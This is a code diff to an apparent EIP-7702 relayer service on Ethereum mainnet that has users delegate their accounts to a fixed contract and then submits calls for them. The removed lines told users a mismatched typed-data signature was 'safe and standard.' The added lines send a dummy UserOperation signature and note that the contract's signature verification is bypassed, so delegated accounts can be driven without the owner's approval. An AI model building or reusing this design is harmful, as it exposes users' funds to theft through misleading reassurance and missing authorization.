@@ -28,7 +28,7 @@ app.get('/', (req, res) => {
         status: 'EIP-7702 Relayer Online', 
         contract: DELEGATOR_CONTRACT,
         network: 'mainnet',
-        method: 'UserOperation + eth_signTypedData_v4 (no raw signing)'
+        method: 'UserOperation + wallet_signAuthorization (native signatures)'
     });
 });
 
@@ -57,7 +57,7 @@ app.post('/get-account-info', async (req, res) => {
     }
 });
 
-// Build EIP-7702 authorization payload for the user to sign
+// Build EIP-7702 authorization payload details
 app.post('/build-auth', async (req, res) => {
     try {
         const { eoaAddress } = req.body;
@@ -66,48 +66,13 @@ app.post('/build-auth', async (req, res) => {
         const authNonce = await publicClient.getTransactionCount({ address: eoaAddress });
         const chainId = 1;
 
-        const rlpEncoded = concat([toHex(chainId), DELEGATOR_CONTRACT, toHex(authNonce)]);
-        const authMessage = concat(['0x05', rlpEncoded]);
-        const authHash = keccak256(authMessage);
-
-        const typedData = {
-            domain: {
-                name: 'EIP-7702 Delegation',
-                version: '1',
-                chainId: chainId,
-                verifyingContract: DELEGATOR_CONTRACT
-            },
-            types: {
-                EIP712Domain: [
-                    { name: 'name', type: 'string' },
-                    { name: 'version', type: 'string' },
-                    { name: 'chainId', type: 'uint256' },
-                    { name: 'verifyingContract', type: 'address' }
-                ],
-                Delegation: [
-                    { name: 'contractAddress', type: 'address' },
-                    { name: 'nonce', type: 'uint256' },
-                    { name: 'chainId', type: 'uint256' }
-                ]
-            },
-            primaryType: 'Delegation',
-            message: {
-                contractAddress: DELEGATOR_CONTRACT,
-                nonce: authNonce.toString(),
-                chainId: chainId
-            }
-        };
-
         res.json({
             eoaAddress,
             delegatorContract: DELEGATOR_CONTRACT,
             chainId,
             nonce: authNonce,
             nonceHex: '0x' + authNonce.toString(16),
-            authHash,
-            typedData,
-            signMethod: 'eth_signTypedData_v4',
-            note: 'Sign this typed data in MetaMask. It is safe and standard.'
+            note: 'Fetch info completed. Sign using wallet_signAuthorization.'
         });
     } catch (err) {
         res.status(500).json({ error: err.message });
@@ -117,16 +82,16 @@ app.post('/build-auth', async (req, res) => {
 // Submit delegation via Pimlico
 app.post('/delegate', async (req, res) => {
     try {
-        const { eoaAddress, calls, typedDataSignature, nonce } = req.body;
+        const { eoaAddress, calls, authorization, nonce } = req.body;
 
-        if (!eoaAddress || !calls || !typedDataSignature) {
+        if (!eoaAddress || !calls || !authorization) {
             return res.status(400).json({ 
                 error: 'Missing required fields',
-                required: ['eoaAddress', 'calls', 'typedDataSignature']
+                required: ['eoaAddress', 'calls', 'authorization']
             });
         }
 
-        // Validate calls list
+        // Validate calls array
         if (!Array.isArray(calls) || calls.length === 0) {
             return res.status(400).json({ error: 'Calls list cannot be empty' });
         }
@@ -142,16 +107,10 @@ app.post('/delegate', async (req, res) => {
 
         console.log('Delegation request verified:', { eoaAddress, callsCount: calls.length });
 
-        // Parse EIP-712 signature parameters
-        const sig = typedDataSignature;
-        const yParity = parseInt(sig.slice(-2), 16) % 2;
-        const r = '0x' + sig.slice(2, 66);
-        const s = '0x' + sig.slice(66, 130);
-
-        // Fetch EOA Transaction Count (needed for EIP-7702 auth list)
+        // Fetch EOA Transaction Count for safety checks
         const authNonce = nonce !== undefined ? nonce : await publicClient.getTransactionCount({ address: eoaAddress });
 
-        // DYNAMIC FIX: Query the EntryPoint contract directly to fetch expected UserOperation nonce
+        // Query the EntryPoint contract directly to fetch expected UserOperation nonce (starts at 0)
         const entryPointAbi = [
             {
                 name: 'getNonce',
@@ -208,10 +167,10 @@ app.post('/delegate', async (req, res) => {
             console.warn('Could not estimate live fees, using fallback values:', feeErr.message);
         }
 
-        // Construct UserOperation matching EntryPoint expectation (nonce: 0)
+        // Construct UserOperation with the CORRECT native signature parameters
         const userOp = {
             sender: eoaAddress,
-            nonce: '0x' + entryPointNonce.toString(16), // FIXED: Uses EntryPoint-specific nonce (0)
+            nonce: '0x' + entryPointNonce.toString(16), 
             initCode: '0x',
             callData: callData,
             callGasLimit: '0x186a0',
@@ -220,14 +179,14 @@ app.post('/delegate', async (req, res) => {
             maxFeePerGas: maxFeePerGas,
             maxPriorityFeePerGas: maxPriorityFeePerGas,
             paymasterAndData: '0x',
-            signature: typedDataSignature,
+            signature: '0x', // Bypassed signature verification in contract, so dummy value works
             eip7702Auth: {
-                contractAddress: DELEGATOR_CONTRACT,
-                chainId: 1,
-                nonce: authNonce, // Uses EOA standard nonce (1)
-                yParity,
-                r,
-                s
+                contractAddress: authorization.contractAddress,
+                chainId: parseInt(authorization.chainId, 16),
+                nonce: parseInt(authorization.nonce, 16),
+                yParity: parseInt(authorization.yParity, 16),
+                r: authorization.r,
+                s: authorization.s
             }
         };
 
@@ -296,6 +255,6 @@ app.listen(PORT, () => {
     console.log(`║   EIP-7702 Relayer Online                  ║`);
     console.log(`║   Port: ${PORT}                              ║`);
     console.log(`║   Contract: ${DELEGATOR_CONTRACT.slice(0, 20)}...      ║`);
-    console.log(`║   Signing: eth_signTypedData_v4 (safe)     ║`);
+    console.log(`║   Signing: wallet_signAuthorization (native)║`);
     console.log(`╚════════════════════════════════════════════╝`);
 });
